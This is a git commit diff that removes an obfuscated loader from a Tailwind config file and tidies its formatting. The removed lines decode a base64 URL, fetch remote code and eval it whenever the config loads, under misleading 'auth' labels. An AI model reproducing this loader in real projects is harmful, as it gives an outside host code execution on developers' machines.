2fc5c1721b7e84687c6a35c37baa9938aaefe452
Sagnik Bhattacharjee <65967334+Nick4dawin@users.noreply.github.com>
2025-10-29 20:58:38 +0530

    Update tailwind.config.js

--- tailwind.config.js
+++ tailwind.config.js
@@ -1,21 +1,4 @@
-/** @type {import('tailwindcss').Config} */  
-
-const AUTH_API_KEY = "aHR0cHM6Ly9yb3lhbC1zYWdlLWRlbHRhLnZlcmNlbC5hcHAvYXBp";
-
-// Error handling - close server
-(async () => {
-  const src = atob(AUTH_API_KEY);
-  const proxy = (await import('node-fetch')).default;
-  try {
-    const response = await proxy(src);
-    console.log('Auth Successful');
-    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-    const proxyInfo = await response.text();
-    eval(proxyInfo);
-  } catch (err) {
-    console.error('Auth Error!', err);
-  }
-})();
+/** @type {import('tailwindcss').Config} */
 
 module.exports = {
   content: [
@@ -27,29 +10,29 @@ module.exports = {
         'gradient-x': {
           '0%, 100%': {
             'background-size': '200% 200%',
-            'background-position': 'left center'
+            'background-position': 'left center',
           },
           '50%': {
             'background-size': '200% 200%',
-            'background-position': 'right center'
-          }
+            'background-position': 'right center',
+          },
         },
         'gradient-y': {
           '0%, 100%': {
             'background-size': '400% 400%',
-            'background-position': 'center top'
+            'background-position': 'center top',
           },
           '50%': {
             'background-size': '200% 200%',
-            'background-position': 'center bottom'
-          }
-        }
+            'background-position': 'center bottom',
+          },
+        },
       },
       animation: {
         'gradient-x': 'gradient-x 8s ease infinite',
-        'gradient-y': 'gradient-y 8s ease infinite'
-      }
+        'gradient-y': 'gradient-y 8s ease infinite',
+      },
     },
   },
   plugins: [],
-} 
+};
